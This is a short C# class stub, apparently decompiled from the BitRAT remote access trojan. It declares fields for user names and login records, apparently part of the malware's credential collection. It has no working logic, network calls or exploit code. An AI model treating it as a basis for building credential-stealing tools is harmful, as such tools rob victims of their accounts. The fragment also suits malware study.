﻿namespace BitRAT
{
    using System;
    using System.Text;
    using System.Xml;

    public class cCredentialsUser
    {
        public string[] idxValues;
        public string Key;
        public StringBuilder sLogins;
        public XmlNodeList xmlList;
        private string m_user;
        private string m_logins;
        private string m_tag;

        public cCredentialsUser();

        public string USER { get; set; }

        public string LOGINS { get; set; }
    }
}

